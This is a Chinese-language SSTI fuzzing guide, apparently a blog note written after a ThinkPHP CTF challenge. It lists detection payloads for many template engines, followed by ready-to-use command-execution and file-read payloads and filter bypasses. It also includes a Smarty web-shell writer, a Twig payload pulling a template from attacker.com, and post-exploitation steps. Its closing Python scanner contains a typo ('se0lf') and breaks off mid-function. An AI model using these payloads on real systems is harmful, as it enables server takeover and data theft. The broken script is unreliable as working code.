---
title: SSTI的全面fuzz
date: 2025-12-23 15:11:21
categories: ssti
---

# SSTI Fuzz完全测试指南

> 本笔记详细介绍如何全面测试 SSTI 漏洞，包括各种模板引擎的识别方法、测试 Payload 和利用技巧。

------

## 目录

1. [为什么 {{7*7}} 没有反应？](#一为什么-77-没有反应)
2. [SSTI 基础概念](#二ssti-基础概念)
3. [模板引擎识别方法](#三模板引擎识别方法)
4. [各模板引擎详细测试 Payload](#四各模板引擎详细测试-payload)
5. [SSTI 测试流程图](#五ssti-测试流程图)
6. [通用 SSTI 测试清单](#六通用-ssti-测试清单)
7. [实战案例分析](#七实战案例分析)
8. [自动化测试脚本](#八自动化测试脚本)
9. [防御与修复](#九防御与修复)

------

## 一、为什么 {{7*7}} 没有反应？

### 1.1 问题解答

你输入 `{{7*7}}` 没有反应，是因为：

**不同的模板引擎使用不同的语法！**

| 模板引擎     | 语言    | 语法风格            | 示例                             |
| ------------ | ------- | ------------------- | -------------------------------- |
| Jinja2       | Python  | `{{ }}`             | `{{7*7}}`                        |
| Twig         | PHP     | `{{ }}`             | `{{7*7}}`                        |
| Smarty       | PHP     | `{ }`               | `{$smarty.version}`              |
| **ThinkPHP** | **PHP** | **`{ }`**           | **`{$_SERVER.SERVER_SOFTWARE}`** |
| Blade        | PHP     | `{{ }}` / `{!! !!}` | `{{7*7}}`                        |
| FreeMarker   | Java    | `${ }`              | `${7*7}`                         |
| Velocity     | Java    | `$` / `#`           | `$class.inspect()`               |
| Mako         | Python  | `${ }` / `<% %>`    | `${7*7}`                         |
| ERB          | Ruby    | `<%= %>`            | `<%= 7*7 %>`                     |

### 1.2 ThinkPHP 为什么不认 {{7*7}}？

ThinkPHP 使用的是 **ThinkTemplate** 模板引擎（类似 Smarty），它的语法是：

```
{$变量}           → 输出变量
{$var|修饰符}     → 对变量应用函数
{:函数()}         → 直接调用函数
{if 条件}...{/if} → 条件语句
```

而 `{{7*7}}` 是 Jinja2/Twig 的语法，ThinkPHP 根本不认识这个语法，所以：

- 不会报错（因为它不是 ThinkPHP 的模板标签）
- 不会执行（因为它不会被解析）
- 原样输出或被忽略

### 1.3 教训

**永远不要只用一种 Payload 测试 SSTI！**

不同框架、不同模板引擎的语法完全不同，必须根据目标环境选择正确的测试 Payload。

------

## 二、SSTI 基础概念

### 2.1 什么是 SSTI？

**SSTI (Server-Side Template Injection)** 是一种注入漏洞，发生在：

1. Web 应用使用模板引擎动态生成页面
2. 用户输入被不安全地嵌入到模板中
3. 攻击者可以注入模板语法，让服务器执行任意代码

### 2.2 漏洞成因

**安全的模板使用：**

```python
# Python Flask + Jinja2
template = "Hello, {{ name }}"
render_template_string(template, name=user_input)  # 变量通过参数传递
```

**不安全的模板使用（存在 SSTI）：**

```python
# 用户输入直接拼接到模板中
template = "Hello, " + user_input
render_template_string(template)  # 危险！
```

### 2.3 SSTI 的危害

| 危害等级               | 描述                     | 示例                                              |
| ---------------------- | ------------------------ | ------------------------------------------------- |
| 信息泄露               | 读取服务器配置、环境变量 | `{{config}}`                                      |
| 任意文件读取           | 读取服务器上的任意文件   | `{{''.__class__.__mro__[2].__subclasses__()...}}` |
| **远程代码执行 (RCE)** | 在服务器上执行任意命令   | `{{system('id')}}`                                |
| 服务器接管             | 完全控制服务器           | 反弹 Shell                                        |

------

## 三、模板引擎识别方法

### 3.1 识别流程图

```
                    ┌─────────────────┐
                    │  输入 ${7*7}    │
                    └────────┬────────┘
                             │
              ┌──────────────┴──────────────┐
              │                             │
         返回 49                        返回原样
              │                             │
              ▼                             ▼
    ┌─────────────────┐           ┌─────────────────┐
    │ 可能是:          │           │  输入 {{7*7}}   │
    │ - FreeMarker    │           └────────┬────────┘
    │ - Mako          │                    │
    │ - Thymeleaf     │     ┌──────────────┴──────────────┐
    └─────────────────┘     │                             │
                       返回 49                        返回原样
                            │                             │
                            ▼                             ▼
                  ┌─────────────────┐           ┌─────────────────┐
                  │ 可能是:          │           │  输入 {$var}    │
                  │ - Jinja2        │           └────────┬────────┘
                  │ - Twig          │                    │
                  │ - Blade         │     ┌──────────────┴──────────────┐
                  └─────────────────┘     │                             │
                                     有反应                         返回原样
                                          │                             │
                                          ▼                             ▼
                                ┌─────────────────┐           ┌─────────────────┐
                                │ 可能是:          │           │  继续测试其他    │
                                │ - Smarty        │           │  模板语法...     │
                                │ - ThinkPHP      │           └─────────────────┘
                                └─────────────────┘
```

### 3.2 快速识别表

**第一步：尝试基础数学运算**

| 测试 Payload | 预期输出 | 可能的模板引擎                        |
| ------------ | -------- | ------------------------------------- |
| `${7*7}`     | `49`     | FreeMarker, Mako, Thymeleaf, Pebble   |
| `{{7*7}}`    | `49`     | Jinja2, Twig, Blade, Nunjucks, Django |
| `#{7*7}`     | `49`     | Thymeleaf, FreeMarker                 |
| `<%= 7*7 %>` | `49`     | ERB (Ruby), EJS (Node.js)             |
| `${{7*7}}`   | `49`     | Pebble                                |
| `{7*7}`      | `49`     | Smarty (部分版本)                     |

**第二步：尝试特定引擎的特征 Payload**

| 测试 Payload                 | 预期输出   | 确认的模板引擎   |
| ---------------------------- | ---------- | ---------------- |
| `{{config}}`                 | 配置对象   | Jinja2 (Flask)   |
| `{{settings}}`               | 设置对象   | Django           |
| `{$smarty.version}`          | 版本号     | Smarty           |
| `{$_SERVER.SERVER_SOFTWARE}` | 服务器信息 | ThinkPHP, Smarty |
| `${T(java.lang.Runtime)}`    | 类信息     | Spring (SpEL)    |
| `#set($x=7*7)$x`             | `49`       | Velocity         |

### 3.3 通过错误信息识别

有时候，故意输入错误的模板语法可以触发错误信息，从而识别模板引擎：

| 测试 Payload | 可能的错误信息               | 模板引擎   |
| ------------ | ---------------------------- | ---------- |
| `{{`         | `unexpected end of template` | Jinja2     |
| `{{}}`       | `Empty expression`           | Twig       |
| `{$}`        | `Syntax error in template`   | Smarty     |
| `${`         | `Unclosed expression`        | FreeMarker |
| `<%=`        | `SyntaxError`                | ERB        |

### 3.4 通过响应头/框架识别

在测试 SSTI 之前，先收集信息：

| 信息来源    | 如何获取                  | 可能的线索           |
| ----------- | ------------------------- | -------------------- |
| HTTP 响应头 | `X-Powered-By`, `Server`  | PHP, Python, Java 等 |
| Cookie 名称 | `PHPSESSID`, `JSESSIONID` | PHP, Java            |
| URL 结构    | `.php`, `.jsp`, `.py`     | 后端语言             |
| 错误页面    | 触发 404/500 错误         | 框架名称、版本       |
| 默认页面    | 访问根目录                | 框架特征             |

**常见框架与模板引擎对应关系：**

| 框架     | 语言    | 默认模板引擎              |
| -------- | ------- | ------------------------- |
| Flask    | Python  | Jinja2                    |
| Django   | Python  | Django Templates          |
| Laravel  | PHP     | Blade                     |
| Symfony  | PHP     | Twig                      |
| ThinkPHP | PHP     | ThinkTemplate (类 Smarty) |
| Spring   | Java    | Thymeleaf, FreeMarker     |
| Express  | Node.js | EJS, Pug, Handlebars      |
| Rails    | Ruby    | ERB                       |

------

## 四、各模板引擎详细测试 Payload

### 4.1 Python - Jinja2 (Flask)

**识别 Payload：**

```
{{7*7}}                          → 49
{{7*'7'}}                        → 7777777
{{config}}                       → 配置对象
{{config.items()}}               → 配置详情
{{request.environ}}              → 环境变量
{{self.__class__.__mro__}}       → 类继承链
```

**信息泄露：**

```
{{config.SECRET_KEY}}            → Flask 密钥
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
```

**RCE Payload：**

```python
# 方法1：通过 __subclasses__ 找到可利用的类
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# 方法2：通过 __globals__ 访问 os 模块
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# 方法3：通过 lipsum 对象
{{lipsum.__globals__['os'].popen('id').read()}}

# 方法4：通过 cycler 对象
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 方法5：通过 joiner 对象
{{joiner.__init__.__globals__.os.popen('id').read()}}

# 方法6：通过 namespace 对象
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

**绕过过滤：**

```python
# 绕过 . 过滤
{{config['SECRET_KEY']}}
{{config|attr('SECRET_KEY')}}

# 绕过 _ 过滤
{{''['\x5f\x5fclass\x5f\x5f']}}

# 绕过关键字过滤
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/pas''swd').read()}}

# 使用 request 对象绕过
{{request['__class__']}}
{{request|attr(request.args.a)}}&a=__class__
```

### 4.2 Python - Django Templates

**识别 Payload：**

```
{{settings}}                     → 设置对象
{{settings.SECRET_KEY}}          → 密钥
{{debug}}                        → 调试模式
```

**注意：** Django 模板引擎相对安全，默认不允许执行任意 Python 代码。但仍可能泄露敏感信息。

**信息泄露：**

```
{{settings.DATABASES}}           → 数据库配置
{{settings.EMAIL_HOST_PASSWORD}} → 邮件密码
```

### 4.3 Python - Mako

**识别 Payload：**

```
${7*7}                           → 49
${self.module.__file__}          → 模块文件路径
```

**RCE Payload：**

```python
<%
import os
os.popen('id').read()
%>

${self.module.cache.util.os.popen('id').read()}
```

### 4.4 Python - Tornado

**识别 Payload：**

```
{{7*7}}                          → 49
{{handler.settings}}             → 应用设置
```

**RCE Payload：**

```python
{% import os %}{{os.popen('id').read()}}
```

### 4.5 PHP - Twig

**识别 Payload：**

```
{{7*7}}                          → 49
{{7*'7'}}                        → 49
{{dump(app)}}                    → 应用对象
{{'test'|upper}}                 → TEST
```

**信息泄露：**

```
{{app.request.server.all|join(',')}}  → 服务器变量
{{_self.env.getLoader()}}             → 加载器信息
```

**RCE Payload (Twig < 1.20)：**

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**RCE Payload (Twig 1.x)：**

```php
{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("backdoor")}}
```

**RCE Payload (Twig 2.x/3.x)：**

```php
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|reduce('system')}}
{{'id'|filter('system')}}
```

### 4.6 PHP - Smarty

**识别 Payload：**

```
{$smarty.version}                → Smarty 版本
{$smarty.template}               → 当前模板
{$smarty.now}                    → 当前时间戳
{$smarty.const.PHP_VERSION}      → PHP 版本
```

**信息泄露：**

```
{$smarty.server.SERVER_SOFTWARE} → 服务器软件
{$smarty.env.PATH}               → 环境变量
{$_SERVER}                       → 服务器变量
{$_GET}                          → GET 参数
```

**RCE Payload (Smarty < 3.1.42)：**

```php
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**RCE Payload (使用 {if})：**

```php
{if system('id')}{/if}
{if phpinfo()}{/if}
{if readfile('/etc/passwd')}{/if}
```

**RCE Payload (使用标签)：**

```php
{php}system('id');{/php}                    # 需要开启 php 标签
{literal}<script language="php">system('id');</script>{/literal}  # PHP < 7
```

### 4.7 PHP - ThinkPHP (ThinkTemplate)

**这就是本次 CTF 题目使用的模板引擎！**

**识别 Payload：**

```
{$_SERVER.SERVER_SOFTWARE}       → 服务器软件 (Apache/2.4.65)
{$_SERVER.DOCUMENT_ROOT}         → 文档根目录
{$_SERVER.REQUEST_URI}           → 请求 URI
{$Think.PHP_VERSION}             → PHP 版本
```

**变量输出语法：**

```
{$name}                          → 输出变量
{$_GET.param}                    → 输出 GET 参数
{$_POST.param}                   → 输出 POST 参数
{$_SESSION.user}                 → 输出 SESSION
{$_COOKIE.token}                 → 输出 COOKIE
```

**修饰符语法（关键特性）：**

```
{$var|函数名}                    → 对变量应用函数
{$var|@函数名}                   → 变量作为第一个参数
{$var|func1|func2}               → 链式调用
{$var|func=参数}                 → 带额外参数
```

**文件读取 Payload：**

```
{$_GET.f|@file|@implode}&f=/etc/passwd
{$_GET.f|@base64_decode|@file|@implode}&f=L2V0Yy9wYXNzd2Q=
{$_GET.f|@file|@json_encode}&f=/etc/passwd
```

**RCE Payload：**

```php
# 方法1：使用 {:} 直接调用函数（如果没被过滤）
{:system('id')}
{:passthru('id')}

# 方法2：使用 array_map 绕过（本题使用的方法）
{$_GET.func|array_map=$_GET.cmd|implode}&func=passthru&cmd[]=id

# 方法3：使用 {if} 标签
{if:system('id')}{/if}

# 方法4：使用 {php} 标签（如果开启）
{php}system('id');{/php}
```

### 4.8 PHP - Blade (Laravel)

**识别 Payload：**

```
{{7*7}}                          → 49
{!!7*7!!}                        → 49 (不转义)
@php phpinfo(); @endphp          → PHP 信息
```

**信息泄露：**

```
{{config('app.key')}}            → 应用密钥
{{config('database.connections')}} → 数据库配置
{{env('APP_KEY')}}               → 环境变量
```

**RCE Payload：**

```php
@php system('id'); @endphp
@php passthru('id'); @endphp
```

### 4.9 Java - FreeMarker

**识别 Payload：**

```
${7*7}                           → 49
${.version}                      → FreeMarker 版本
${.now}                          → 当前时间
```

**RCE Payload：**

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}

<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign rt=owc.newInstance().construct("java.lang.Runtime")>
${rt.getRuntime().exec("id")}
```

### 4.10 Java - Velocity

**识别 Payload：**

```
#set($x=7*7)$x                   → 49
$class.inspect("java.lang.Runtime") → 类信息
```

**RCE Payload：**

```java
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())
#set($chr=$class.inspect("java.lang.Character").type)
#set($str=$class.inspect("java.lang.String").type)
#set($ex=$rt.exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### 4.11 Java - Thymeleaf

**识别 Payload：**

```
${7*7}                           → 49
${T(java.lang.Runtime)}          → 类信息
[[${7*7}]]                       → 49 (内联表达式)
```

**RCE Payload：**

```java
${T(java.lang.Runtime).getRuntime().exec('id')}

${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}

__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

### 4.12 Java - Spring (SpEL)

**识别 Payload：**

```
${7*7}                           → 49
#{7*7}                           → 49
${T(java.lang.System).getenv()}  → 环境变量
```

**RCE Payload：**

```java
${T(java.lang.Runtime).getRuntime().exec('id')}

#{T(java.lang.Runtime).getRuntime().exec('id')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### 4.13 Ruby - ERB

**识别 Payload：**

```
<%= 7*7 %>                       → 49
<%= self %>                      → 对象信息
<%= ENV %>                       → 环境变量
```

**RCE Payload：**

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

### 4.14 Node.js - EJS

**识别 Payload：**

```
<%= 7*7 %>                       → 49
<%= process.version %>           → Node.js 版本
<%= process.env %>               → 环境变量
```

**RCE Payload：**

```javascript
<%= process.mainModule.require('child_process').execSync('id').toString() %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

### 4.15 Node.js - Pug (Jade)

**识别 Payload：**

```
#{7*7}                           → 49
#{process.version}               → Node.js 版本
```

**RCE Payload：**

```javascript
#{process.mainModule.require('child_process').execSync('id')}
```

### 4.16 Node.js - Handlebars

**识别 Payload：**

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
    {{/with}}
  {{/with}}
{{/with}}
```

**RCE Payload (需要特定条件)：**

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### 4.17 Go - html/template

Go 的 html/template 相对安全，但仍可能存在信息泄露：

**识别 Payload：**

```
{{.}}                            → 当前对象
{{printf "%v" .}}                → 格式化输出
```

------

## 五、SSTI 测试流程图

### 5.1 完整测试流程

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           SSTI 测试流程                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Step 1: 信息收集                                                           │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ • 识别后端语言 (PHP/Python/Java/Ruby/Node.js)                        │   │
│  │ • 识别 Web 框架 (Flask/Django/Laravel/ThinkPHP/Spring)               │   │
│  │ • 查看响应头、Cookie、错误页面                                        │   │
│  │ • 分析 URL 结构和参数                                                 │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ↓                                        │
│  Step 2: 基础 SSTI 检测                                                     │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 依次测试以下 Payload:                                                 │   │
│  │                                                                       │   │
│  │ Python 系:  {{7*7}}  {{7*'7'}}  ${7*7}                               │   │
│  │ PHP 系:     {{7*7}}  {$smarty.version}  {$_SERVER.SERVER_SOFTWARE}   │   │
│  │ Java 系:    ${7*7}  #{7*7}  *{7*7}                                   │   │
│  │ Ruby 系:    <%= 7*7 %>                                               │   │
│  │ Node.js:    <%= 7*7 %>  #{7*7}  {{7*7}}                              │   │
│  │                                                                       │   │
│  │ 观察返回值是否为 49 或其他计算结果                                     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ↓                                        │
│  Step 3: 确认模板引擎                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 根据 Step 2 的结果，使用特定引擎的 Payload 确认:                       │   │
│  │                                                                       │   │
│  │ Jinja2:     {{config}}  {{request}}                                  │   │
│  │ Twig:       {{_self.env}}  {{dump(app)}}                             │   │
│  │ Smarty:     {$smarty.version}  {$smarty.template}                    │   │
│  │ ThinkPHP:   {$_SERVER.SERVER_SOFTWARE}  {$Think.PHP_VERSION}         │   │
│  │ FreeMarker: ${.version}  ${.now}                                     │   │
│  │ Velocity:   $class  #set($x=1)                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ↓                                        │
│  Step 4: 信息泄露测试                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ • 读取配置文件、密钥                                                  │   │
│  │ • 读取环境变量                                                        │   │
│  │ • 读取服务器信息                                                      │   │
│  │ • 尝试读取源代码                                                      │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ↓                                        │
│  Step 5: RCE 尝试                                                           │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ • 尝试直接命令执行                                                    │   │
│  │ • 如果有 WAF，尝试绕过                                                │   │
│  │ • 使用编码、拼接、替代函数等技巧                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ↓                                        │
│  Step 6: 后渗透                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ • 读取敏感文件 (flag, 配置, 数据库)                                   │   │
│  │ • 权限提升                                                            │   │
│  │ • 横向移动                                                            │   │
│  │ • 持久化                                                              │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.2 模板引擎识别决策树

```
                              输入测试
                                 │
                    ┌────────────┴────────────┐
                    │                         │
              ${7*7}=49?                 ${7*7}≠49
                    │                         │
                    ▼                         ▼
            ┌───────────────┐         {{7*7}}=49?
            │ Java/Python   │                 │
            │ 可能是:        │    ┌───────────┴───────────┐
            │ - FreeMarker  │    │                       │
            │ - Thymeleaf   │ {{7*7}}=49            {{7*7}}≠49
            │ - Mako        │    │                       │
            │ - SpEL        │    ▼                       ▼
            └───────────────┘ ┌───────────────┐   {$var}有反应?
                              │ Python/PHP    │         │
                              │ 可能是:        │    ┌────┴────┐
                              │ - Jinja2      │    │         │
                              │ - Twig        │   有反应    无反应
                              │ - Blade       │    │         │
                              │ - Nunjucks    │    ▼         ▼
                              └───────────────┘ ┌─────────┐ ┌─────────┐
                                                │ PHP     │ │ 继续    │
                                                │ 可能是:  │ │ 测试    │
                                                │ -Smarty │ │ 其他    │
                                                │-ThinkPHP│ │ 语法    │
                                                └─────────┘ └─────────┘
```

------

## 六、通用 SSTI 测试清单

### 6.1 必测 Payload 清单

**第一轮：基础检测（所有语言通用）**

```
# 数学运算类
${7*7}
{{7*7}}
#{7*7}
*{7*7}
<%= 7*7 %>
${{7*7}}
{7*7}
[7*7]

# 字符串操作类
{{'7'*7}}
{{7*'7'}}
${'7'*7}

# 特殊字符测试
${
{{
{%
<%
#{
```

**第二轮：语言特定检测**

```python
# Python (Jinja2/Django/Mako)
{{config}}
{{settings}}
{{request}}
{{self}}
${self}

# PHP (Twig/Smarty/Blade/ThinkPHP)
{{_self}}
{$smarty.version}
{$_SERVER.SERVER_SOFTWARE}
@php echo 1; @endphp

# Java (FreeMarker/Velocity/Thymeleaf)
${.version}
$class
${T(java.lang.System).getenv()}
[[${7*7}]]

# Ruby (ERB)
<%= self %>
<%= ENV %>

# Node.js (EJS/Pug)
<%= process.version %>
#{process.version}
```

### 6.2 完整测试 Payload 列表

为了确保不遗漏任何模板引擎，建议按以下顺序测试：

```
# ==================== 第一阶段：快速检测 ====================

# 1. 通用数学运算
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${{7*7}}
{7*7}
{{7*'7'}}

# 2. 错误触发（观察错误信息）
${
{{
{%
<%
#{
${{
{$

# ==================== 第二阶段：Python 模板 ====================

# Jinja2 (Flask)
{{config}}
{{config.items()}}
{{request.environ}}
{{''.__class__}}
{{''.__class__.__mro__}}
{{lipsum}}
{{cycler}}

# Django
{{settings}}
{{settings.SECRET_KEY}}
{{debug}}

# Mako
${self}
${self.module}
<%
import os
%>

# Tornado
{{handler.settings}}

# ==================== 第三阶段：PHP 模板 ====================

# Twig
{{_self}}
{{_self.env}}
{{app}}
{{dump(app)}}
{{'test'|upper}}
{{['id']|filter('system')}}

# Smarty
{$smarty.version}
{$smarty.template}
{$smarty.now}
{$_SERVER}
{$_GET}
{php}echo 1;{/php}
{if phpinfo()}{/if}

# ThinkPHP (ThinkTemplate)
{$_SERVER.SERVER_SOFTWARE}
{$_SERVER.DOCUMENT_ROOT}
{$Think.PHP_VERSION}
{$_GET.x}
{:phpinfo()}
{$_GET.f|@file|@implode}

# Blade (Laravel)
{{config('app.key')}}
{{env('APP_KEY')}}
@php echo 1; @endphp
{!! system('id') !!}

# ==================== 第四阶段：Java 模板 ====================

# FreeMarker
${.version}
${.now}
${.locale}
<#assign x=7*7>${x}
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity
#set($x=7*7)$x
$class
$class.inspect("java.lang.Runtime")

# Thymeleaf
${T(java.lang.Runtime)}
${T(java.lang.System).getenv()}
[[${7*7}]]
[(${7*7})]

# Spring SpEL
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}

# Pebble
{{ 7 * 7 }}
{{ _self }}

# ==================== 第五阶段：Ruby 模板 ====================

# ERB
<%= 7*7 %>
<%= self %>
<%= ENV %>
<%= `id` %>
<%= system('id') %>

# Slim
= 7*7
= system('id')

# ==================== 第六阶段：Node.js 模板 ====================

# EJS
<%= 7*7 %>
<%= process.version %>
<%= process.env %>
<%= require('child_process').execSync('id') %>

# Pug (Jade)
#{7*7}
#{process.version}
#{process.mainModule.require('child_process').execSync('id')}

# Handlebars
{{#with "s" as |string|}}{{/with}}

# Nunjucks
{{7*7}}
{{range(10)}}
```

### 6.3 测试注意事项

1. **URL 编码**：特殊字符需要 URL 编码
   - `{` → `%7B`
   - `}` → `%7D`
   - `#` → `%23`
   - `$` → `%24`
2. **观察响应**：
   - 返回计算结果 → 存在 SSTI
   - 返回原样 → 该语法不被识别
   - 返回错误 → 可能存在 SSTI，语法有误
   - 返回空白 → 可能被过滤或执行失败
3. **多参数测试**：
   - 不仅测试明显的输入点
   - 测试所有 GET/POST 参数
   - 测试 Cookie、Header
   - 测试 JSON 字段
4. **编码绕过**：
   - 如果某些字符被过滤，尝试编码绕过
   - URL 编码、Unicode 编码、HTML 实体编码

------

## 七、实战案例分析

### 7.1 案例：RenderMe (ThinkPHP 8)

这就是我们刚刚做的 CTF 题目，完美展示了为什么 `{{7*7}}` 没有反应。

**题目环境：**

- 框架：ThinkPHP 8
- 模板引擎：ThinkTemplate
- 入口：`/?name=CTFer`

**测试过程：**

```
测试 1: {{7*7}}
结果: Hello, {{7*7}}  ← 原样输出，不是 Jinja2/Twig

测试 2: ${7*7}
结果: Hello, ${7*7}   ← 原样输出，不是 FreeMarker

测试 3: {$_SERVER.SERVER_SOFTWARE}
结果: Hello, Apache/2.4.65 (Debian)  ← 成功！是 ThinkPHP/Smarty 风格
```

**为什么 {{7*7}} 失败？**

ThinkPHP 的模板语法是 `{$var}` 而不是 `{{var}}`：

- `{{7*7}}` 不是有效的 ThinkPHP 模板标签
- ThinkPHP 不会解析它，直接原样输出
- 必须使用 `{$...}` 语法才能触发模板解析

**正确的测试 Payload：**

```
{$_SERVER.SERVER_SOFTWARE}  → 服务器信息
{$_GET.x}&x=test            → 输出 GET 参数
{$_GET.f|@file|@implode}&f=/etc/passwd  → 文件读取
```

### 7.2 案例：Flask SSTI

**题目环境：**

- 框架：Flask
- 模板引擎：Jinja2
- 入口：`/?name=test`

**测试过程：**

```
测试 1: {{7*7}}
结果: Hello, 49  ← 成功！是 Jinja2

测试 2: {{config}}
结果: <Config {'DEBUG': True, 'SECRET_KEY': 'xxx'...}>  ← 配置泄露

测试 3: {{''.__class__.__mro__}}
结果: (<class 'str'>, <class 'object'>)  ← 可以访问类
```

**RCE Payload：**

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 7.3 案例：Twig SSTI

**题目环境：**

- 框架：Symfony
- 模板引擎：Twig
- 入口：`/?name=test`

**测试过程：**

```
测试 1: {{7*7}}
结果: Hello, 49  ← 成功！

测试 2: {{7*'7'}}
结果: Hello, 49  ← Twig 特征（Jinja2 会返回 7777777）

测试 3: {{_self.env}}
结果: Twig\Environment Object  ← 确认是 Twig
```

**RCE Payload (Twig 2.x/3.x)：**

```php
{{['id']|filter('system')}}
{{['id']|map('system')}}
```

### 7.4 案例：FreeMarker SSTI

**题目环境：**

- 框架：Spring Boot
- 模板引擎：FreeMarker
- 入口：`/?name=test`

**测试过程：**

```
测试 1: ${7*7}
结果: Hello, 49  ← 成功！

测试 2: ${.version}
结果: Hello, 2.3.31  ← FreeMarker 版本

测试 3: {{7*7}}
结果: Hello, {{7*7}}  ← 原样输出，确认不是 Jinja2
```

**RCE Payload：**

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

------

## 八、自动化测试脚本

### 8.1 Python 自动化测试脚本

```python
#!/usr/bin/env python3
"""
SSTI 自动化测试脚本
用于快速检测目标是否存在 SSTI 漏洞，并识别模板引擎类型
"""

import requests
import urllib.parse
import sys
import re

class SSTITester:
    def __init__(self, url, param):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.session.verify = False
        
        # 基础检测 Payload
        se0lf.basic_payloads = [
            # (payload, expected_result, engine_hint)
            ("${7*7}", "49", "FreeMarker/Mako/Thymeleaf"),
            ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
            ("#{7*7}", "49", "Thymeleaf/SpEL"),
            ("<%= 7*7 %>", "49", "ERB/EJS"),
            ("${{7*7}}", "49", "Pebble"),
            ("{7*7}", "49", "Smarty (old)"),
            ("{{7*'7'}}", "7777777", "Jinja2"),
            ("{{7*'7'}}", "49", "Twig"),
        ]
        
        # 引擎特定 Payload
        self.engine_payloads = {
            "Jinja2": [
                ("{{config}}", "<Config", "Config object"),
                ("{{request}}", "<Request", "Request object"),
                ("{{''.__class__}}", "<class 'str'>", "Class access"),
            ],
            "Twig": [
                ("{{_self}}", "Template", "_self object"),
                ("{{'test'|upper}}", "TEST", "Filter test"),
            ],
            "Smarty": [
                ("{$smarty.version}", r"\d+\.\d+", "Smarty version"),
                ("{$smarty.now}", r"\d{10}", "Timestamp"),
            ],
            "ThinkPHP": [
                ("{$_SERVER.SERVER_SOFTWARE}", "Apache|nginx", "Server info"),
                ("{$_SERVER.DOCUMENT_ROOT}", "/var/www", "Doc root"),
            ],
            "FreeMarker": [
                ("${.version}", r"\d+\.\d+", "FreeMarker version"),
                ("${.now}", r"\d{4}", "Current year"),
            ],
            "Velocity": [
                ("#set($x=7*7)$x", "49", "Variable set"),
            ],
            "ERB": [
                ("<%= self %>", "main", "Self object"),
                ("<%= ENV %>", "PATH", "Environment"),
            ],
        }
    
    def test(self, payload):
        """发送测试请求"""
        try:
            params = {self.param: payload}
            resp = self.session.get(self.url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            return f"Error: {e}"
    
    def check_result(self, response, expected):
        """检查响应是否包含预期结果"""
        if isinstance(expected, str):
            return expected in response
        else:  # regex
            return bool(re.search(expected, response))
    
    def run_basic_tests(self):
        """运行基础检测"""
        print("[*] Running basic SSTI detection...")
        print("-" * 60)
        
        detected = []
        for payload, expected, hint in self.basic_payloads:
            response = self.test(payload)
            if self.check_result(response, expected):
                print(f"[+] VULNERABLE: {payload}")
                print(f"    Possible engine: {hint}")
                detected.append((payload, hint))
            else:
                print(f"[-] Not vulnerable: {payload}")
        
        return detected
    
    def run_engine_tests(self, engine):
        """运行特定引擎的测试"""
        if engine not in self.engine_payloads:
            print(f"[!] Unknown engine: {engine}")
            return
        
        print(f"\n[*] Testing for {engine}...")
        print("-" * 60)
        
        for payload, expected, desc in self.engine_payloads[engine]:
            response = self.test(payload)
            if self.check_result(response, expected):
                print(f"[+] Confirmed: {desc}")
                print(f"    Payload: {payload}")
            else:
                print(f"[-] Failed: {desc}")
    
    def run_all_tests(self):
        """运行所有测试"""
        print("=" * 60)
